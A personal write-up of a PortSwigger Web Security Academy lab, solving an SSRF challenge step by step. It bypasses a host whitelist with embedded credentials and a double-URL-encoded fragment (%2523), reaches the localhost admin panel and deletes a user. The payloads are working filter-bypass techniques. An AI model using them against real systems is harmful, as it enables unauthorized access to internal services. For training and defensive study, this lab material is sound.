
# #PortSwigger 


![[Pasted image 20251213214204.png]]


## Lab Description

This lab has a stock check feature which fetches data from an internal system.

**Objective:** Change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`.

**Additional Challenge:** The developer has deployed an anti-SSRF defense (whitelist) that you need to bypass.

---
---


### Step 1: Capture the Stock Check Request

1. In Burp's browser, access the lab
2. Visit a product page
3. Click **Check stock**
4. In Burp Proxy, find the `POST /product/stock` request

**Example request:**
```
POST /product/stock HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
```


---

### Step 2: Test Direct Localhost (Blocked)

**Payload:**
```
stockApi=http://localhost/admin
```

**Response:**
```
"External stock check host must be stock.weliketoshop.net"
```

![[Pasted image 20251213214145.png]]
- *Whitelist confirmed: only `stock.weliketoshop.net` is allowed.*


---

### Step 3: Test Embedded Credentials

**Payload:**
```
stockApi=http://username@stock.weliketoshop.net/
```

**Response:** Accepted

**Why this works:**
- The URL parser extracts the hostname → `stock.weliketoshop.net`
- The whitelist check passes
- The server connects to `stock.weliketoshop.net`


---

### Step 4: Test with `#` Fragment

**Payload:**
```
stockApi=http://localhost#@stock.weliketoshop.net/
```
- ***Response:** Rejected.*


---

### Step 5: Double URL Encode `#`

**Payload:**
```
stockApi=http://localhost%2523@stock.weliketoshop.net/
```

**Response:** Accepted! (Internal Server Error)

**Why this works:*
- First decode: `%2523` --> `%23`
- Second decode: `%23` --> `#`
- The URL parser sees: `http://localhost#@stock.weliketoshop.net/`
- The hostname becomes `localhost` (SSRF!)


---

![[Pasted image 20251213215307.png]]



### Step 6: Access Admin Interface

**Payload:**
```
stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin
```

**Response:** Admin interface displayed
![[Pasted image 20251213215550.png]]


---

### Step 7: Delete Carlos

**Payload:**
```
stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
```

![[Pasted image 20251213215643.png]]

**Response:** `302 Found` --> User deleted!
![[Pasted image 20251213215657.png]]


![[Pasted image 20251213215720.png]]


---

### Step 8: Lab Solved

![[Pasted image 20251213215746.png]]


----
---
